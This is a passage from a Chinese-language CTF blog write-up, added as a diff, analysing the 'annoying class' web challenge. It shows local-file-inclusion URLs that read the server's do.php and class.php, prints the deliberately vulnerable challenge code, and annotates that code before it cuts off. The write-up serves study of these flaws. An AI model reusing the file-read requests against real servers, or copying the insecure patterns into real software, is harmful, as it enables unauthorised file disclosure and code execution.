@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前段时间刚结束了2019北邮中学生网安杯，趁现在题目还没关，学习一波:)。">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="annoying class wp">
+<meta property="og:url" content="http://yoursite.com/2019/03/04/annoying class/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前段时间刚结束了2019北邮中学生网安杯，趁现在题目还没关，学习一波:)。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/8.png">
+<meta property="og:updated_time" content="2019-03-19T06:16:09.642Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="annoying class wp">
+<meta name="twitter:description" content="前段时间刚结束了2019北邮中学生网安杯，趁现在题目还没关，学习一波:)。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/04/annoying class/">
+
+
+
+
+
+  <title>annoying class wp | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/04/annoying class/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ll">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">annoying class wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-04T20:02:24+08:00">
+                2019-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前段时间刚结束了2019北邮中学生网安杯，趁现在题目还没关，学习一波:)。</p>
+<a id="more"></a>
+<h4 id="annoying-class"><a href="#annoying-class" class="headerlink" title="annoying class"></a>annoying class</h4><p>网站有两个功能，一个是<code>上传图片</code>，一个是<code>查看图片</code>。图片只能上传<code>png</code>、<code>gif</code>、<code>jpg</code>、<code>jpeg</code>。<br><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/1.png" alt="1"><br>查看图片的页面的url：<br><a href="http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=upload/f80ab1372d366318f1ba16ac24545c8b5dfcfc29.jpg" target="_blank" rel="noopener">http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=upload/f80ab1372d366318f1ba16ac24545c8b5dfcfc29.jpg</a><br>可能存在<code>lfi</code>。在查看图片的页面的源代码中，发现图片直接以base64写到网页上。试一下查看do.php。<br><a href="http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=do.php" target="_blank" rel="noopener">http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=do.php</a><br>将源代码中的编码部分用base64解码，得到do.php。<br>do.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">"class.php"</span>;</span><br><span class="line">    <span class="comment">// require_once "flag.php";</span></span><br><span class="line">    header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">    ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/:/tmp'</span>);</span><br><span class="line"></span><br><span class="line">    $ll1lIl = $_GET[<span class="string">"module"</span>];</span><br><span class="line">    $lI1111 = $_GET[<span class="string">"args"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($ll1lIl)) &#123;</span><br><span class="line">        $lI1I11=<span class="string">'http://'</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">"REQUEST_URI"</span>]; </span><br><span class="line">        header(<span class="string">'Location: '</span>.dirname($lI1I11).<span class="string">"/index.html"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $Il11II = <span class="keyword">new</span> o0Ooo0oO($ll1lIl, $lI1111);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>读一下flag.php发现被过滤，尝试读取class.php。<br>class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">oOO0000O</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ll1lIl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $ll1lIl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">lI1111</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/file|\.\.|flag/i"</span>, <span class="keyword">$this</span>-&gt;ll1lIl)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="keyword">$this</span>-&gt;ll1lIl))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;lI1111()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'I\'m not stupid!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"data:"</span>.mime_content_type(<span class="keyword">$this</span>-&gt;ll1lIl).<span class="string">";charset=utf-8;base64,"</span>;</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;ll1lIl));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\" \\&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OOOo0Oo0</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">private</span> $lI1111;</span><br><span class="line">    <span class="keyword">private</span> $lI1I11;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1I11 = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">IlII1l</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $IllI1I = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>, <span class="string">'jpeg'</span>);</span><br><span class="line">        $Il11ll = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;ll1lIl);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111 = end($Il11ll);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;lI1111, $IllI1I)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = sha1(random_bytes(<span class="number">40</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;IlII1l() ) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"I'm not a stupid person!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111)) &#123;</span><br><span class="line">            unlink(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111, <span class="keyword">$this</span>-&gt;lI1I11);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I have done everything for you, checkout "</span> . <span class="keyword">$this</span>-&gt;ll1lIl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o0Ooo0oO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">private</span> $lI1111;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ll1lIl, $lI1111)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $ll1lIl;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111 = $lI1111;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;lI1I11()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Can not do that for you!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">lI1I11</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;ll1lIl, <span class="keyword">array</span>(<span class="string">'oOO0000O'</span>, <span class="string">'OOOo0Oo0'</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111=<span class="keyword">array</span>(<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($ll1lIl, $lI1111)</span> </span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass($ll1lIl);</span><br><span class="line">	    $a=$class-&gt;newInstanceArgs($lI1111[<span class="number">0</span>]?$lI1111[<span class="number">0</span>]:<span class="keyword">array</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ll1lIl !== <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;ll1lIl&#125;(<span class="keyword">$this</span>-&gt;lI1111);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>do.php中通过get传入的<code>module</code>和<code>args</code>实例化了一个<code>o0Ooo0oO</code>类。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Il11II = <span class="keyword">new</span> o0Ooo0oO($ll1lIl, $lI1111);</span><br></pre></td></tr></table></figure></p>
+<p>class.php中查看下<code>o0Ooo0oO</code>类。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o0Ooo0oO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">private</span> $lI1111;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ll1lIl, $lI1111)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $ll1lIl; <span class="comment">// $_GET['module']</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111 = $lI1111; <span class="comment">// $_GET['args']</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;lI1I11()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Can not do that for you!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">lI1I11</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;ll1lIl, <span class="keyword">array</span>(<span class="string">'oOO0000O'</span>, <span class="string">'OOOo0Oo0'</span>))) &#123; <span class="comment">// module只能传入class.php中的另外两个类名</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111=<span class="keyword">array</span>(<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($ll1lIl, $lI1111)</span> </span>&#123; <span class="comment">// 当调用的方法不存在的时候，解释器会调用__call()方法</span></span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass($ll1lIl); <span class="comment">// ReflectionClass类报告了一个类的有关信息</span></span><br><span class="line">	    $a=$class-&gt;newInstanceArgs($lI1111[<span class="number">0</span>]?$lI1111[<span class="number">0</span>]:<span class="keyword">array</span>()); <span class="comment">// 创建一个类的新实例，给出的参数以array形式传递到类的构造函数中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ll1lIl !== <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;ll1lIl&#125;(<span class="keyword">$this</span>-&gt;lI1111); <span class="comment">// 调用的方法不存在，会调用_call()方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该类会在调用析构函数<code>__destruct()</code>的时候触发<code>__call()</code>方法，该方法会根据传入的<code>module</code>的值实例化一个新类。<br>根据网站功能对应的url知道，当<code>module=OOOo0Oo0</code>为上传文件界面，当<code>module=oOO0000O</code>为查看图片界面。<br>按顺序先看一下<code>OOOo0Oo0</code>类。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OOOo0Oo0</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">private</span> $lI1111;</span><br><span class="line">    <span class="keyword">private</span> $lI1I11;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1I11 = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">IlII1l</span><span class="params">()</span> </span>&#123; <span class="comment">// 限制文件格式</span></span><br><span class="line">        $IllI1I = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>, <span class="string">'jpeg'</span>);</span><br><span class="line">        $Il11ll = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;ll1lIl);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111 = end($Il11ll);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;lI1111, $IllI1I)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = sha1(random_bytes(<span class="number">40</span>)); <span class="comment">// 文件上传到服务器之后的名字</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;IlII1l() ) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"I'm not a stupid person!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111)) &#123;</span><br><span class="line">            unlink(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">"upload/"</span>.<span class="keyword">$this</span>-&gt;ll1lIl.<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;lI1111, <span class="keyword">$this</span>-&gt;lI1I11);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I have done everything for you, checkout "</span> . <span class="keyword">$this</span>-&gt;ll1lIl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该类会验证文件类型，上传成功则会返回存储到服务器的文件名。<br>再看一下<code>oOO0000O</code>类。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">oOO0000O</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ll1lIl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $ll1lIl;</span><br><span 